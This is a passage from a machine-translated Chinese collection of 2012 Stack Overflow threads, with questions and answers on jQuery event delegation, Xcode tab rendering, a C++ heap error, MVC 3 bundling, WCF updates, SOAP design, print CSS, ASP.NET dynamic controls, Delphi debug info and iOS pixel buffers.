第一个对我来说似乎更安全，性能更高，你有什么建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:44:36.853

当更新面板中的内容更新时，这些元素将被替换为没有事件绑定的新元素。

您需要使用[委托](http://api.jquery.com/delegate/)而不是将事件绑定到元素本身。将其绑定在更新面板周围的元素上，以便在更新面板中的内容被替换后处理事件：

对于 jQuery 1.4.2 及更高版本：

```
jQuery("#form1").delegate("input[type='text']", "click", function () {
  this.select();
}); 
```

对于 jQuery 1.7 及更高版本：

```
jQuery("#form1").on("click", "input[type='text']", function () {
  this.select();
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T19:45:38.420

You have to use `live` or `on` for registering `click` event as click event you have is un-binded on ajax call. `live` or `on` jquery method ensure the event is re-binded as the element is added to `DOM` which comes under `live` or `on` selector. Your jquery version is quite old you need to upgrade it might be 1.7.2

```
jQuery(document).ready(
      function () {
            jQuery(document).on("click", "input[type='text']", function () {
            this.select();
       });
}); 
```

# xcode - 当缩进级别大于三时，为什么 Xcode 会停止绘制选项卡？

> ID：12646251
> 
> 赞同：3
> 
> 时间：2012-09-28T19:34:08.793
> 
> 标签：xcode, macos, xcode4, editor, osx-mountain-lion

出于某种原因，如果行上的前导空格超过三个制表符，Xcode 4.5 和 4.4.1 都停止在适当的级别显示缩进文本。

比描述更容易展示： ![代码缩进问题展示](../Images/c7a62800f68f123beb5e0d790d563788.png)

箭头指向的行上有五个前导选项卡，但 Xcode 将其绘制为好像只有三个。使用左右箭头键确认选项卡在那里。

我已经删除了与我的项目相关的派生数据，删除了项目包中的`project.xcworkspace`文件和`xcuserdata`目录，在 Xcode 的首选项中使用了各种缩进设置组合，都无济于事。

新创建的项目表现出相同的行为。更改源代码编辑器字体首选项也无效。这是在 OS X 10.8.1 中。

帮助——当代码“看起来不正确”时，我的大脑无法理解代码！我还能尝试什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-08T07:05:40.693

所以，我提交了一个雷达，然后收到了我的一个朋友的回复，他遇到了同样的问题。您是否使用 Adob​​e 的新 SourceCode Pro 字体？您的屏幕截图使您看起来可能是。尝试切换回不同的主题并重新启动 Xcode？这就是我所做的，它似乎很好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T20:57:04.020

最终我删除了（退出 Xcode 后）整个`UserData`文件夹`~/Library/Developer/Xcode`，这似乎解决了问题。

希望恢复我习惯的所有关键等效项和语法着色不会花费超过半小时。

让问题“活着”，以防它发生在其他人身上。

# c++ - 删除数组错误

> ID：12646254
> 
> 赞同：2
> 
> 时间：2012-09-28T19:34:21.993
> 
> 标签：c++, arrays, delete-operator

所以我有以下类方法（如果需要，可能会添加更多）：

编辑 1：这里是 paObject 被初始化的地方以及它如何保持直到它到达`setCapacity(int c)`

```
template <Object>
ArrayClass<Object>::ArrayClass()
{
    _size = 0; //default in case allocation fails
    paObject = new Object[ARRAY_CLASS_DEFAULT_SIZE];
    if (paObject == NULL)
        throw Exception();
    _size = ARRAY_CLASS_DEFAULT_SIZE;
} 
```

重要的是要注意我的类 Vector 扩展（或任何它在 C++ 中）`ArrayClass`：`class MyVector: virtual public ArrayClass<Object>{}`然后在

```
template <class Object>
MyVector<Object>::MyVector() : ArrayClass<Object>()
{
    _currSize = 0;
    _incFactor = 5;
} 
```

它强制调用 ArrayClass 构造函数。

```
 template <Object >    
    void MyVector<Object>::setCapacity(int c)
    {
        int len = _currSize;
        if (len > c) len = c;
        Object* paNew = new Object[c];
        if (paNew == NULL) throw Exception();
        for (int i = 0; i < len; i++)
            paNew[i] = paObject[i];
        if (paObject != NULL)
            delete[] paObject;
        paObject = paNew;
        _size = c;
        if (_currSize > len)
            _currSize = len;
    } 
```

发生错误时，c`6`的值为 _currSize（类私有 int 变量）的值为`1`. 值得注意的是，paObject 是一个 Object 类型的类指针（它是一个模板......等等），在错误发生时使用大小为 1 的 Objects 数组进行了初始化（`Object* paObject = new Object[1]`）。

一切都执行得很好，直到它到达该行时`delete[] paObject;`它给了我一个`Expression: _BLOCK_TYPE_IS_VALID(pHead->nBlockUse)`错误。

我真的不明白出了什么问题。帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:46:14.590

当您遇到堆问题时会发生此错误。
就像是：

```
int *a = new char[1];
a[500] = 0; 
```

然后，在完全不相关的对象上，您将在`delete`or上得到一个错误`new`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:52:55.363

您还没有向我们展示 paObject 在哪里声明...或它在哪里（重新）初始化...

...但这几乎肯定是问题所在。

如果您尚未将其初始化为 NULL，则它可能包含随机垃圾。在这种情况下，它不会评估为 NULL，并且会发生坏事。

同样，如果不明确将其重置为 NULL，那么也会发生坏事。

当然，我们甚至不知道 paObject 是否是一个数组（使用“new []”分配）……因为您没有向我们展示。

底线：

1）确保paObject在使用前已初始化，并在重新使用前正确初始化。

2）如果将其视为数组对象，请确保将其初始化为数组对象

3) 您还需要注意“对象”、“对象引用”（&Object 或 Object *）、对象数组之间的差异。特别是，您需要考虑何时传递对现有对象的引用，或者何时（可能无意地）创建新对象。

这些链接应该会有所帮助：

*   [http://cplus.about.com/od/learning1/ss/constructors.htm](http://cplus.about.com/od/learning1/ss/constructors.htm)

*   [http://www.tutorialspoint.com/cplusplus/cpp_copy_constructor.htm](http://www.tutorialspoint.com/cplusplus/cpp_copy_constructor.htm)

==================================================== =================

附录：

听起来错误`Expression: _BLOCK_TYPE_IS_VALID(pHead->nBlockUse)`正在发生，因为您正在覆盖您的数组。

```
Object* paObject = new Object[1]  // This is really easy to overwrite! 
```

我看不到*您*在代码中写入 paObject 的位置（或写入 paObject 的某个别名），但我几乎可以肯定这就是问题所在。

恕我直言...

# asp.net-mvc-3 - Styles.Render/Scripts.Render 不在 MVC 3 中渲染

> ID：12646258
> 
> 赞同：1
> 
> 时间：2012-09-28T19:34:43.520
> 
> 标签：asp.net-mvc-3

我正在使用带有 .NET Framework 4 的 MVC 3 捆绑和缩小。创建*BundleConfig.cs*并放在`App_Data`文件夹下。从*Global.asax*文件中调用
。 从我调用的主文件`BundleConfig.RegisterBundles(BundleTable.Bundles);``Application_Start()`

 *```
<% Styles.Render("~/Content/themes/base"); %>
<% Scripts.Render("~/Scripts","~/Scripts/Controllers","~/Scripts/Views");%> 
```

在标题标签上。
然而，CSS 未按预期呈现，jQuery 未按`Scripts.Render`预期工作。

我的*BundleConfig.cs*类定义如下...

```
 public class BundleConfig
 {
    public static void RegisterBundles(BundleCollection bundles)
    {
        bundles.Add(new StyleBundle("~/Content/themes/base").Include(
            "~/Content/themes/base/Blueprint-Liquid.css",
            "~/Content/themes/base/ex.css",
            "~/Content/themes/base/exNav.css",
            "~/Content/themes/base/ie.css",
            "~/Content/themes/base/jquery-ui-1.8.14.custom.css",
            "~/Content/themes/base/jquery.qtip.css",
            "~/Content/themes/base/reset.css",
            "~/Content/themes/base/Site.css",
            "~/Content/themes/base/structure-fixed.css",
            "~/Content/themes/base/structure-fluid.css",
            "~/Content/themes/base/tipsy.css",
            "~/Content/themes/base/typography.css",
            "~/Content/themes/base/ui.jqgrid.css")
        );

        bundles.Add(new ScriptBundle("~/Scripts/Controllers").Include(
            "~/Scripts/Controllers/ProjectController.js",
            "~/Scripts/Controllers/RequestController.js",
            "~/Scripts/Controllers/SystemController.js")
        );

        bundles.Add(new ScriptBundle("~/Scripts/Views").Include(
            "~/Scripts/Views/ProjectView.js",
            "~/Scripts/Views/RequestView.js",
            "~/Scripts/Views/SystemView.js")
        );

        bundles.Add(new ScriptBundle("~/Scripts").Include(
              "~/Scripts/Dialog.js",
              "~/Scripts/EX.Computing.js",
              "~/Scripts/exNav.js",
              "~/Scripts/grid.locale-en.js",
              "~/Scripts/jquery-1.6.2.js",
              "~/Scripts/jquery-1.6.2.min.js",
              "~/Scripts/jquery-ui-1.8.14.js",
              "~/Scripts/jquery-ui-1.8.14.min.js",
              "~/Scripts/jquery.jqGrid.fluid.js",
              "~/Scripts/jquery.jqGrid.min.js",
              "~/Scripts/jquery.jqGrid.src.js",
              "~/Scripts/jquery.qtip.js",
              "~/Scripts/jquery.tipsy.js",
              "~/Scripts/jquery.jquery.unobtrusive-ajax.js",
              "~/Scripts/jquery.jquery.unobtrusive-ajax.min.js",
              "~/Scripts/jquery.jquery.validate-vsdoc.js",
              "~/Scripts/jquery.validate.js",
              "~/Scripts/jquery.validate.min.js",
              "~/Scripts/jquery.validate.unobtrusive.js",
              "~/Scripts/jquery.validate.unobtrusive.min.js",
              "~/Scripts/json2.js",
              "~/Scripts/Labels.js",
              "~/Scripts/modernizr-1.7.js",
              "~/Scripts/SessionTimeOut.js",
              "~/Scripts/underscore.js")
       );

       BundleTable.EnableOptimizations = true; 
   } 
```

我想知道我错过了什么？非常感谢任何帮助！

谢谢， 拉马尼

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-05T21:12:28.373

当我开始使用 Bundling and Minification 时，我不确定它是否适用于 MVC3，但发现它没有任何问题。我想在这里分享我的代码，以便对某人有所帮助。

```
using System.Web.Optimization;

namespace Ex.Computing
{
  public class BundleConfig
  {
    public static void RegisterBundles(BundleCollection bundles)
    {
         bundles.Add(new StyleBundle("~/Content/themes/base/css").Include(

                        "~/Content/themes/base/reset.css",
                        "~/Content/themes/base/Blueprint-Liquid.css",
                        "~/Content/themes/base/jquery-ui-1.8.23.custom.css",
                        "~/Content/themes/base/typography.css",
                        "~/Content/themes/base/eXNav.css",
                        "~/Content/themes/base/structure-fluid.css",
                        "~/Content/themes/base/eX.css",
                        "~/Content/themes/base/ui.jqgrid.css",
                        "~/Content/themes/base/Site.css",
                        "~/Content/themes/base/jquery.qtip.css"

                       )
                 ); 

         bundles.GetBundleFor("~/Content/themes/base/css").Orderer = new AppCssOrderer();

         var bootstrapOrdering = new BundleFileSetOrdering("bootstrap");

         bundles.Add(new ScriptBundle("~/Scripts/js").Include(
             "~/Scripts/eXNav.js",
             "~/Scripts/jquery-1.8.1-vsdoc.js",
             "~/Scripts/jquery-1.8.1.js",
             "~/Scripts/jquery-ui-1.8.23.custom.min.js",
             "~/Scripts/Labels.js",
             "~/Scripts/Dialog.js",
             "~/Scripts/SessionTimeOut.js",
             "~/Scripts/jquery.qtip.js",
             "~/Scripts/json2.js",
             "~/Scripts/jquery.watermark.min.js",
             "~/Scripts/grid.locale-en.js",
             "~/Scripts/jquery.jqGrid.src.js",
             "~/Scripts/jquery.jqGrid.fluid.js",
             "~/Scripts/jquery.validate.min.js",
             "~/Scripts/jquery.validate.unobtrusive.min.js",
             "~/Scripts/Computing.js",
             "~/Scripts/Controllers/ProjectController.js",
             "~/Scripts/Controllers/RequestController.js",
             "~/Scripts/Controllers/SystemController.js",
             "~/Scripts/Views/ProjectView.js",
             "~/Scripts/Views/RequestView.js",
             "~/Scripts/Views/SystemView.js"

              )
        );

         bundles.GetBundleFor("~/Scripts/js").Orderer = new AppJsOrderer();

         BundleTable.EnableOptimizations = true; 

      }
  }

  public class AppCssOrderer : IBundleOrderer 
  { 
    public IEnumerable<System.IO.FileInfo> OrderFiles(BundleContext context,   
    IEnumerable<System.IO.FileInfo> files)
    { 
       // return files.OrderBy(f => f.Name == "eyNav.css" ? -1 : 1); 
        if (context == null)
            throw new ArgumentNullException("context");

        if (files == null)
            throw new ArgumentNullException("files");

        return files;
    }
  }

  public class AppJsOrderer : IBundleOrderer
  {
    public IEnumerable<System.IO.FileInfo> OrderFiles(BundleContext context, 
    IEnumerable<System.IO.FileInfo> files)
    {
        // return files.OrderBy(f => f.Name == "eyNav.css" ? -1 : 1); 
        if (context == null)
            throw new ArgumentNullException("context");

        if (files == null)
            throw new ArgumentNullException("files");

        return files;
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T19:57:37.580

欢迎加入我们的俱乐部：[Microsoft ASP.NET Web Optimization Framework 1.0.0 调试模式错误](https://stackoverflow.com/questions/12000935/microsoft-asp-net-web-optimization-framework-1-0-0-debug-mode-error/12402214#12402214)

我用下一个代码解决了这个问题，但我不喜欢这个解决方案：

```
BundleTable.EnableOptimizations = true; 
```*

# c# - 限制 WCF 传输文件的性能因素

> ID：12646260
> 
> 赞同：1
> 
> 时间：2012-09-28T19:34:52.510
> 
> 标签：c#, wcf, auto-update

我正在开发一种自动软件更新服务，其中客户端通过互联网获取软件的更新版本，我们正在考虑通过 HTTP 从远程服务器下载，因为它不受防火墙限制的影响。

更新服务器，必须能够验证请求，检查软件的许可证并为客户端提供正确的更新文件（好像可能有多个版本的软件需要更新）

一个 ASP.net Web 应用程序可能能够完成这项工作，但是我试图避免使用 Web 应用程序，因为它需要安装在 IIS 中。我正在考虑`basicHttp`托管在 Windows 服务中的 WCF 库`Streamed transferMode`，但是我读过文章说“使用 WCF 传输文件不是一个好习惯！我想知道为什么 WCF 不是文件传输技术？有什么限制和备择方案？

您是否建议为这项工作提供 WCF Windows 服务？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:18:42.333

这并不能完全回答您关于 WCF 和传输文件的问题，但是不久前我构建了一个自动更新程序应用程序，它有一个小型客户端前端到 WinForms 应用程序。它将获取本地文件列表，生成每个文件的 MD5 哈希，并将其发送到 Web 服务，以便与 Web 服务器上的本地文件列表进行比较。Web 服务方法返回已更改文件的列表。

然后，客户端将遍历该列表并调用另一个 Web 服务，该服务将为每个文件返回一个字节数组并将其转储到本地硬盘驱动器。

完成后，它将在更新的应用程序的 exe 上执行 Process.Start。

它已经在生产环境中运行了一年多，有几百个活跃用户，没有出现任何问题。

# soap - SOAP - 方法参数的最佳实践

> ID：12646261
> 
> 赞同：2
> 
> 时间：2012-09-28T19:35:00.977
> 
> 标签：soap, soa

有这样的方法会更好吗：

#1`void AddPerson(Person p);`

或者

#2`void AddPerson(int id, string lastName, string firstName);`

解释。

我注意到的一个问题是我无法将我的网络浏览器指向 AddPerson 并测试#1，但我可以测试#2。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T02:52:10.427

除了**ahus1**所说的，创建一个单独的 Person.xsd XML 模式几乎总是一个好主意，因为这样您可以将此 Person.xsd 导入其他 XML 模式，例如 Invoice.xsd，创建一种通用语言来描述你的事。

此外，它使编排服务变得更加简单，假设您可能将给定的客户属性添加到实际上来自 Person 类型的 Invoice。这样，您只需一步即可将客户价值分配给其他 Person 元素，而不必在每一步中复制所有 Person 属性。

您可以在[Canonical Schema](http://www.soapatterns.org/canonical_schema.php) SOA Pattern 中找到有关这种方法的好处的良好信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T19:54:36.993

如果您传递一个人而不是不同的元素，那么当您将来增强 Person 时会更容易，例如使用出生日期：您的方法名称保持不变，您只需增强您的域模型填充或阅读您需要的出生日期。

此外，您会发现，一旦您获得嵌套对象（如果您想添加即地址），Person 而不是元素将为您的方法提供统一的方式。

最好的问候，亚历山大。

# javascript - 打印网页时如何隐藏输入？

> ID：12646263
> 
> 赞同：1
> 
> 时间：2012-09-28T19:35:18.480
> 
> 标签：javascript, html, css, printing, media

我正在使用下面的脚本：

```
<script>
function printpage()
{
window.print()
}
</script 
```

用这个来调用它：

```
<input type="button" value="Print this page" onclick="printpage()" /> 
```

但我不知道如何在脚本中插入：

```
$('input' )
.hide(); 
```

这意味着来自打印区域的所有输入都是隐藏的。

有任何想法吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-28T19:37:31.507

您可以通过将媒体类型指定为使用 CSS 来解决此问题`print`：

```
 <style type="text/css" media="print">
/*<![CDATA[*/
    input{
        display:none;
    }
  /*]]>*/
  </style> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-28T19:38:57.403

使用@Media CSS 规则：

```
@media print {
  input {visibility:hidden;}
} 
```

或者

```
@media print {
  input {display:none;}
} 
```

这些选项之间的选择取决于您的页面流： display:none 完全删除输入，而 visibility:hidden 只是隐藏它，但它仍然占据它的位置。

你不需要在 JavaScript 中隐藏它。

# asp.net - 在我的 ASP.Net 网站上遇到动态控件问题

> ID：12646264
> 
> 赞同：1
> 
> 时间：2012-09-28T19:35:22.133
> 
> 标签：asp.net, vb.net, session, dynamic, viewstate

我有一个asp.net 网页，这给我带来了一些问题。我开发了以下类来为页面生成搜索过滤器。搜索过程并不重要，因为它已经起作用了。我想动态生成搜索过滤器。

```
Imports Microsoft.VisualBasic
Imports System.Collections.Generic
Imports System.Collections.ObjectModel
Imports MEI.SPDocuments.Type

Public Class SearchFilter
    Private WithEvents _genreDropDown As DropDownList
    Private WithEvents _subGenreDropDown As DropDownList
    Private WithEvents _txtValue As TextBox
    Private _txtBoxAutoCompleteExtender As AjaxControlToolkit.AutoCompleteExtender
    Private _filterGenres As Collection(Of String)
    Private _programSubGenres() As String = {"Program ID,GetPrograms", "Territory ID,GetTerritories", _
                                             "Rep Name,GetRepNames", "District ID,GetDistricts", "DM Name,GetDMNames", "Region ID,GetRegions", _
                                             "RM Name,GetRMNames", "Speaker Counter,GetSpeaker", "Vedor ID,GetVendors", "Vendor Name,GetVendorName", _
                                             "Date Range,", "City,", "State,", "Pay To,", "Expense Range,", "PIF ID,GetPifs"}
    Private _speakerSubGenres() As String = {"Speaker Counter,GetSpeaker", "Speaker Last Name,GetSpeakerLNames", "Speaker First Name,GetSpeakerFNames"}
    Private _expenseSubGenres() As String = {"Expense Counter,GetExpenses"}
    Private _vendorSubGenres() As String = {"Vendor ID,GetVendors", "Vendor Name,GetVendorName"}
    Private _trackSubGenres() As String = {"Track Number,GetTracks", "HCP First Name,GetHCPFName", "HCP Last NameGetHCPLName"}

    Public Sub New(ByVal company As CompanyCode, ByVal year As DocumentYearCode)
        _filterGenres = New Collection(Of String)

    _txtValue = New TextBox
    _txtValue.ID = Guid.NewGuid.ToString

    _txtBoxAutoCompleteExtender = New AjaxControlToolkit.AutoCompleteExtender
    With _txtBoxAutoCompleteExtender
        .ID = "AC__" + _txtValue.ID
        .MinimumPrefixLength = 1
        .EnableCaching = False
        .ServicePath = "~/AutoComplete.asmx"
        .ServiceMethod = "PlaceHolder"
        .TargetControlID = _txtValue.ID
        .CompletionListCssClass = "CompletionList"
        .CompletionListHighlightedItemCssClass = "ItemHighlighted"
        .CompletionListItemCssClass = "ListItem"
        .DelimiterCharacters = ""
        .Enabled = True
    End With

    Select Case company
        Case CompanyCode.AbbottAnimalHealth, CompanyCode.AbbottDiabetesCare, CompanyCode.AbbottDiagnosticsDivision, CompanyCode.AbbottMedicalOptics, CompanyCode.AbbottMolecular, _
            CompanyCode.AbbottPointOfCare, CompanyCode.AbbottVascular, CompanyCode.Corporate, CompanyCode.DivAbbottNutrition, CompanyCode.EstablishedProductsDivision, _
            CompanyCode.GlobalPharmaceuticalResearchAndDevelopment, CompanyCode.GlobalStrategicMarketingAndServices, CompanyCode.PharmaseuticalProductsGroup, _
            CompanyCode.ProprietaryPharmaceuticalsDivision, CompanyCode.RegulatoryAffairsPPG
            _filterGenres.Add("Div Docs")
        Case Else
            _filterGenres.Add("Program")
            _filterGenres.Add("Speaker")
            _filterGenres.Add("Expense")
            _filterGenres.Add("Vendor")
    End Select
    _genreDropDown = New DropDownList
    _genreDropDown.AutoPostBack = True
    _genreDropDown.Attributes.Add("runat", "server")
    AddHandler _genreDropDown.SelectedIndexChanged, AddressOf _genreDropDown_ItemChanged

    _subGenreDropDown = New DropDownList
    _subGenreDropDown.AutoPostBack = True
    _subGenreDropDown.Attributes.Add("runat", "server")
    AddHandler _subGenreDropDown.SelectedIndexChanged, AddressOf _subGenreDropDown_ItemChanged
    PopulateDDls()
End Sub

Private Sub PopulateDDls()
    _genreDropDown.Items.Add("")
    For Each s As String In _filterGenres
        _genreDropDown.Items.Add(s)
    Next
End Sub

Private Sub _genreDropDown_ItemChanged(ByVal sender As Object, ByVal e As System.EventArgs)
    _subGenreDropDown.Items.Clear()
    _subGenreDropDown.Items.Add("")
    Select Case _genreDropDown.SelectedItem.ToString
        Case "Program"
            For Each s As String In _programSubGenres
                Dim li As New ListItem(s.Split(CChar(","))(0), s.Split(CChar(","))(1))

                _subGenreDropDown.Items.Add(li)
            Next
        Case "Speaker"
            For Each s As String In _speakerSubGenres
                Dim li As New ListItem(s.Split(CChar(","))(0), s.Split(CChar(","))(1))

                _subGenreDropDown.Items.Add(li)
            Next
        Case "Expense"
            For Each s As String In _expenseSubGenres
                Dim li As New ListItem(s.Split(CChar(","))(0), s.Split(CChar(","))(1))

                _subGenreDropDown.Items.Add(li)
            Next
        Case "Vendor"
            For Each s As String In _vendorSubGenres
                Dim li As New ListItem(s.Split(CChar(","))(0), s.Split(CChar(","))(1))

                _subGenreDropDown.Items.Add(li)
            Next
        Case "Div Docs"
            For Each s As String In _trackSubGenres
                Dim li As New ListItem(s.Split(CChar(","))(0), s.Split(CChar(","))(1))

                _subGenreDropDown.Items.Add(li)
            Next
    End Select
End Sub

Private Sub _subGenreDropDown_ItemChanged(ByVal Sender As Object, ByVal e As System.EventArgs)
    _txtBoxAutoCompleteExtender.ServiceMethod = _subGenreDropDown.SelectedValue.ToString
    If _subGenreDropDown.SelectedValue.ToString = String.Empty Then _txtBoxAutoCompleteExtender.ServiceMethod = "PlaceHolder"
End Sub

Public Function createMyTableRow() As HtmlTableRow
    Dim myRow As New HtmlTableRow

    myRow.Cells.Add(New HtmlTableCell())
    myRow.Cells.Add(New HtmlTableCell())
    myRow.Cells.Add(New HtmlTableCell())

    myRow.Cells(0).Controls.Add(_genreDropDown)
    myRow.Cells(1).Controls.Add(_subGenreDropDown)
    myRow.Cells(2).Controls.Add(_txtValue)
    myRow.Cells(2).Controls.Add(_txtBoxAutoCompleteExtender)

    Return myRow
End Function

Private Sub newAutoCompleteExtender(ByVal genre As String)
    If _txtValue.Parent.Controls.Count = 2 Then
        _txtValue.Parent.Controls.RemoveAt(1)
    End If

    _txtValue.Parent.Controls.Add(_txtBoxAutoCompleteExtender)
End Sub

End Class

Public Class SearchFilterGroup

Private _searchFilterCollection As Collection(Of SearchFilter)
Private _tableContainer As HtmlTable
Private _company As CompanyCode
Private _year As DocumentYearCode
Public WithEvents _addFilterButton As New Button

Public Sub New(ByVal company As CompanyCode, ByVal year As DocumentYearCode)
    _searchFilterCollection = New Collection(Of SearchFilter)
    _tableContainer = New HtmlTable
    _company = company
    _year = year

    _addFilterButton.Text = "Add Filter"
    _addFilterButton.Attributes.Add("runat", "server")
    _addFilterButton.ID = "btnAddFilter"
    AddHandler _addFilterButton.Click, AddressOf _addFilterButton_Click
End Sub

Public Sub _addFilterButton_Click(ByVal Sender As Object, ByVal e As System.EventArgs)
    _searchFilterCollection.Add(New SearchFilter(_company, _year))
    _tableContainer.Rows.Add(_searchFilterCollection(_searchFilterCollection.Count - 1).createMyTableRow)
End Sub

Public Function table() As HtmlTable
    _tableContainer.Rows.Add(New HtmlTableRow)
    _tableContainer.Rows(0).Cells.Add(New HtmlTableCell)
    _tableContainer.Rows(0).Cells(0).ColSpan = 3

    _tableContainer.Rows(0).Cells(0).Controls.Add(_addFilterButton)
    _addFilterButton_Click(Nothing, Nothing)
    _addFilterButton_Click(Nothing, Nothing)

    Return _tableContainer
End Function
End Class 
```

我在设计一种持久化生成控件的方法时遇到问题。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-21T13:06:56.837

基本上，对于您所做的任务，最好创建自定义服务器控件。在 ASP.NET 中存在 CompositeControl 类，它简化了开发您自己的服务器控件，例如应该包括一些其他服务器控件（如面板、texbox 等）作为子项。

开始创建自己的服务器控件的一个很好的链接是 Dino Esposito 文章：[ASP.NET 控件开发速成课程：构建复合控件](http://msdn.microsoft.com/en-us/library/aa479016.aspx)

# delphi - Delphi - 包括 TD32 调试信息

> ID：12646269
> 
> 赞同：3
> 
> 时间：2012-09-28T19:35:38.900
> 
> 标签：delphi

我正在使用 Delphi 5.0 并试图使应用程序与 Test Complete 兼容。为此，我必须通过选择项目 --> 项目选项 --> 链接器 --> 包含 TD32 调试信息来构建我的应用程序。这一切都很好，但问题是在应用程序中包含该调试信息是否有任何缺点。我注意到的一件事是应用程序大小增加了 3 倍左右。请让我知道选择 Include TD32 Debug Info 使用应用程序有多安全。

感谢帮助..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:40:26.463

如果您在应用程序的发布版本中包含 TD32 调试信息，那么您还包含程序的完整源代码。您可能只想将 TD32 调试信息用于内部构建，并发布没有 TD32 的版本。

SmartBear 有一个名为[StripTDS](http://support.smartbear.com/viewarticle/33105/)的实用程序。这允许您拥有可执行文件外部的 TD32 信息。它通过将其从可执行文件中删除并将其保存到单独的文件中来实现这一点。这很可能是您正在寻找的。

# php - 如何为soap请求构造键值对

> ID：12646270
> 
> 赞同：1
> 
> 时间：2012-09-28T19:35:38.857
> 
> 标签：php, soap, soap-client

我需要帮助（通常是 SOAP 新手）在我的请求 XML 中创建以下输出：

```
<values> 
<table> 
<key xsi:type="xsd:string">SOME_KEY</key> 
<value xsi:type="xsd:string">SOME_VALUE</value> 
</table> 
</values> 
```

我只需要知道如何在 PHP 中构造它并将其作为方法的参数传递给soapclient。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-01-11T16:02:35.270

```
 <pre1:results>
           <!--Zero or more repetitions:-->
           <sys:KeyValuePairOfstringstring>
              <sys:key>str1</sys:key>
              <sys:value>str2</sys:value>
           </sys:KeyValuePairOfstringstring>
        </pre1:results> 
```

在这种情况下，“results”是 IEnumerable<string, string> 参数名称

# ios - CVOpenGLESTextureCacheCreateTextureFromImage 返回错误 6683

> ID：12646273
> 
> 赞同：7
> 
> 时间：2012-09-28T19:35:46.000
> 
> 标签：ios, opengl-es-2.0, yuv

我目前正在尝试使用 YUV420 格式（双平面）在 openGL 中绘制图像。我收到原始数据，并尝试将其解析为 CVPixelBuffer，然后使用 CVOpenGLESTextureCacheCreateTextureFromImage 传递所述缓冲区。虽然在解析到 CVPixelBuffer 时没有收到错误，但在尝试传递到 CVOpenGLESTextureCacheCreateTextureFromImage 时收到错误 (-6683)。我正在尽我所能遵循苹果的 GLCameraRipple 示例代码 - 再次除外，我使用的是原始图像数据而不是来自相机的数据。

希望有人可以解释我在这里缺少什么-我认为这是缺少的属性...

仅供参考，平面 0 是 Y 平面，平面 1 是 UV 平面 - 其中 UV 平面应该是 Y 平面宽度和高度的一半。

```
size_t numPlanes = image->GetNumPlanes();
size_t planeWidth[numPlanes];
size_t planeHeight[numPlanes];
size_t scanWidth[numPlanes];
void *planeIndex[numPlanes];
for(int i = 0; i<numPlanes; i++){
    i<1 ? planeWidth[i] = image->GetWidth() : planeWidth[i] = image->GetWidth()/2;
    i<1 ? planeHeight[i] = image->GetHeight() : planeWidth[i] = image->GetHeight()/2;
    scanWidth[i] = image->GetScanWidth(i);
    planeIndex[i] = image->GetPlanePointer(i);
}

CVPixelBufferRef pixelBuffer;
CFDictionaryRef empty;
CFMutableDictionaryRef attrs;
empty = CFDictionaryCreate(kCFAllocatorDefault,
                           NULL,
                           NULL,
                           0,
                           &kCFTypeDictionaryKeyCallBacks,
                           &kCFTypeDictionaryValueCallBacks);

attrs = CFDictionaryCreateMutable(kCFAllocatorDefault,
                                  1,
                                  &kCFTypeDictionaryKeyCallBacks,
                                  &kCFTypeDictionaryValueCallBacks);

CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, empty);

CVReturn cvError = CVPixelBufferCreateWithPlanarBytes(kCFAllocatorDefault,
                                                      image->GetWidth(),
                                                      image->GetHeight(),
                                                      kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
                                                      nil,
                                                      nil,
                                                      numPlanes,
                                                      planeIndex,
                                                      planeWidth,
                                                      planeHeight,
                                                      scanWidth,
                                                      nil, nil, attrs, &pixelBuffer);
if(cvError) NSLog(@"Error at CVPixelBufferCreateWithPlanarBytes:  %d", cvError);

CVReturn err;
size_t width = CVPixelBufferGetWidth(pixelBuffer);
size_t height = CVPixelBufferGetHeight(pixelBuffer);

if (!_videoTextureCache)
{
    NSLog(@"No video texture cache");
    return;
}

if (_bModel == nil ||
    width != _textureWidth ||
    height != _textureHeight)
{
    _textureWidth = width;
    _textureHeight = height;

    _bModel = [[BufferModel alloc] initWithScreenWidth:_screenWidth
                                          screenHeight:_screenHeight
                                            meshFactor:_meshFactor
                                          textureWidth:_textureWidth
                                         textureHeight:_textureHeight];

    [self setupBuffers];
}

[self cleanUpTextures];

// CVOpenGLESTextureCacheCreateTextureFromImage will create GLES texture
// optimally from CVImageBufferRef.

// Y-plane
glActiveTexture(GL_TEXTURE0);
err = CVOpenGLESTextureCacheCreateTextureFromImage(kCFAllocatorDefault,
                                                   _videoTextureCache,
                                                   pixelBuffer,
                                                   NULL,
                                                   GL_TEXTURE_2D,
                                                   GL_RED_EXT,
                                                   _textureWidth,
                                                   _textureHeight,
                                                   GL_RED_EXT,
                                                   GL_UNSIGNED_BYTE,
                                                   0,
                                                   &_lumaTexture);
if (err)
{
    NSLog(@"Error at CVOpenGLESTextureCacheCreateTextureFromImage %d", err);
} 
```

感谢任何能够提供帮助的人。虽然我知道有一个类似的问题（不完全相同），但所说的问题也很老，从未收到任何回复。我希望我的情况能有更多的运气。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-01T06:40:24.333

您创建的 CVPixelBuffer 中的 iosurface 属性为 null。

手动创建：

`<CVPixelBuffer 0x1fd52790 width=1280 height=720 pixelFormat=420v iosurface=0x0 planes=2>`

由 CMSampleBufferGetImageBuffer 创建：

`<CVPixelBuffer 0x1fd521e0 width=1280 height=720 pixelFormat=420f iosurface=0x21621c54 planes=2>`

据我所知，没有解决办法。

* * *

## 回答 #2

